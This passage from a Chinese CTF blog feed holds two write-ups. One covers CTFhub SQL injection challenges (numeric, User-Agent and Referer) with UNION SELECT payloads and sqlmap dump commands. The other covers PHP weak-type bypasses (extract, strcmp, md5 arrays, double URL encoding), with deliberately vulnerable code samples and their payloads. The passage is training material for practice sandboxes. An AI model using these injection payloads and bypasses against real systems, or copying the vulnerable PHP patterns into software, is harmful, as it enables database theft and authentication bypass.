src="https://img-blog.csdnimg.cn/20210127152708187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.判断注入类型<br>输入1，有回显；输入1 and 1=1，正常回显；输入1 and 1=2,  返回错误。<br><img src="https://img-blog.csdnimg.cn/20210127152937575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注入类型为数字型注入</p><p>2.判断字段数<br>当<code>1 order by 2</code> 时，回显正常，当<code>1 order by 3</code>时，无回显，所以字段数为2<br><img src="https://img-blog.csdnimg.cn/20210127153140753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()<br></code></pre></td></tr></table></figure><p>当前数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127153316846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>有两个表， news,llvyiyrndd<br><img src="https://img-blog.csdnimg.cn/20210127153357173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>5.爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;llvyiyrndd&#x27;</span><br></code></pre></td></tr></table></figure><p>字段名为mgrbaiuvpa<br><img src="https://img-blog.csdnimg.cn/20210127153448891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(mgrbaiuvpa) <span class="hljs-keyword">from</span> llvyiyrndd<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127153551534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>sqlmap–UA注入</strong></p><blockquote><p>在sqlmap中lever&gt;=3才会去检查user-agent头是否存在注入漏洞</p></blockquote><p>首先检测是否有UA注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-532573947dea4d7b.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3</span><br><br>sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3</span><br></code></pre></td></tr></table></figure><p>user-agent处存在注入<br><img src="https://img-blog.csdnimg.cn/20210127160432116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3  --dbs</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127154207704.png" alt="在这里插入图片描述"><br>2.爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3 -D sqli --tables</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127154647309.png" alt="在这里插入图片描述"><br>3.爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3 -D sqli -T llvyiyrndd --columns</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127155148329.png" alt="在这里插入图片描述"><br>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3 -D sqli -T llvyiyrndd -C mgrbaiuvpa --dump</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127155209659.png" alt="在这里插入图片描述"></p><h2 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h2><p><img src="https://img-blog.csdnimg.cn/20210127161950997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示请在referer输入ID，bp抓包<br><img src="https://img-blog.csdnimg.cn/20210127162149802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>补充Referer头<br><img src="https://img-blog.csdnimg.cn/20210127162227937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()<br></code></pre></td></tr></table></figure><p>当前数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127162404134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>有两个表， news,scghlrqxyi<br><img src="https://img-blog.csdnimg.cn/20210127162506792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;scghlrqxyi&#x27;</span><br></code></pre></td></tr></table></figure><p>字段名为vzbmlruwwt<br><img src="https://img-blog.csdnimg.cn/20210127162548886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(vzbmlruwwt) <span class="hljs-keyword">from</span> scghlrqxyi<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127162635557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>sqlmap–Refer注入</strong></p><blockquote><p>伪造http请求中的referer，level&gt;=3时，sqlmap尝试referer注入</p></blockquote><p>首先检测是否有Refer注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3</span><br></code></pre></td></tr></table></figure><p>Referer头存在注入<br><img src="https://img-blog.csdnimg.cn/20210127164244547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>1.爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3 --dbs</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164340575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3 -D sqli --tables</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164517402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3 -D sqli -T scghlrqxyi --columns</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164603239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3 -D sqli -T scghlrqxyi -C vzbmlruwwt --dump</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164810825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFhub</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计之弱类型绕过</title>
    <link href="/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/"/>
    <url>/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>摘要：PHP弱类型绕过方法</p> <a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>之前做过没有总结，这几天做题经常遇见弱类型绕过，写篇博客总结一下(水一篇)，嘻嘻。</p></blockquote><p>提到php代码绕过，必然会提起<code>比较操作符</code>,下面来谈一谈比较操作符<code>==</code>与<code>===</code>，这两种都可以比较两个数字的大小，但是有很明显的区别。</p><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>把两端变量类型转换成相同的，再进行比较</td></tr><tr><td>===</td><td>先判断两端变量类型是否相同，再进行比较</td></tr></tbody></table><p><strong>注意</strong>：在两个相等的符号中，一个字符串与一个数字相比较时，字符串会转换成数值。</p><h2 id="1-extract变量覆盖"><a href="#1-extract变量覆盖" class="headerlink" title="1.extract变量覆盖"></a>1.extract变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>;<br>extract(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>)) &#123;<br><span class="hljs-variable">$content</span>=trim(file_get_contents(<span class="hljs-variable">$flag</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>) &#123;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;flag&#123;xxx&#125;&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>extract()</td><td>函数从数组中将变量导入到当前的符号表</td></tr></tbody></table><p>在第三行, 运用了extract()函数, 将GET方式获得的变量导入到当前的符号表中,然后判断$ flag和$ shiyan两个变量的内容是否相等。</p><p>extract()函数导致这段代码存在一个变量覆盖漏洞,构造Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload:?flag=&amp;shiyan=<br></code></pre></td></tr></table></figure><p> $ flag和$ shiyan这两个变量的内容都会被设置成空字符串。这样,就满足$shiyan == $content的条件，输出flag。<br><img src="https://img-blog.csdnimg.cn/20200425110348780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="2-strcmp比较字符串"><a href="#2-strcmp比较字符串" class="headerlink" title="2.strcmp比较字符串"></a>2.strcmp比较字符串</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;xxxxx&#125;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (strcmp(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>], <span class="hljs-variable">$flag</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="hljs-comment">//比较两个字符串（区分大小写）</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>); <br>    <span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;No&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>用法</th><th>返回值</th></tr></thead><tbody><tr><td>strcmp()</td><td>strcmp(string1,string2)</td><td>若返回0,代表两个字符串相等 ；若返回&lt;0 ,代表string1 小于 string2；若返回&gt;0，代表string1 大于 string2</td></tr></tbody></table><p>对于传入非字符串类型的数据的时候，strcmp函数会报错，将return 0 ，但却判定其相等了。<br> 所以，strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload:?a[]=<span class="hljs-number">123</span> <br></code></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/20200425113316110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="3-urldecode二次编码绕过"><a href="#3-urldecode二次编码绕过" class="headerlink" title="3.urldecode二次编码绕过"></a>3.urldecode二次编码绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$_GET</span>[id] = urldecode(<span class="hljs-variable">$_GET</span>[id]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;hackerDJ&quot;</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access granted!&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>urldecode()</td><td>解码已编码的 URL 字符串</td></tr></tbody></table><p>使用GET传参时，浏览器就已经把hakerDJ进行了一次解码了，然后又用了urldecode函数又再次进行了一次解码。所以我们要将hakerDJ进行二次编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">42</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">41</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031180041123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="4-md5-函数"><a href="#4-md5-函数" class="headerlink" title="4.md5()函数"></a>4.md5()函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Your password can not be your username.&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) === md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th></th><th>描述</th></tr></thead><tbody><tr><td>md5()</td><td>函数计算字符串的 MD5 散列</td></tr><tr><td>==</td><td>只需要等号两边的值是否相等。比如‘1’==1就成立，返回true</td></tr><tr><td>===</td><td>需要全等号两边的值和类型全都相等才成立</td></tr></tbody></table><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload:?username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200425115133708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="5-数组返回NULL绕过"><a href="#5-数组返回NULL绕过" class="headerlink" title="5.数组返回NULL绕过"></a>5.数组返回NULL绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;--&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span 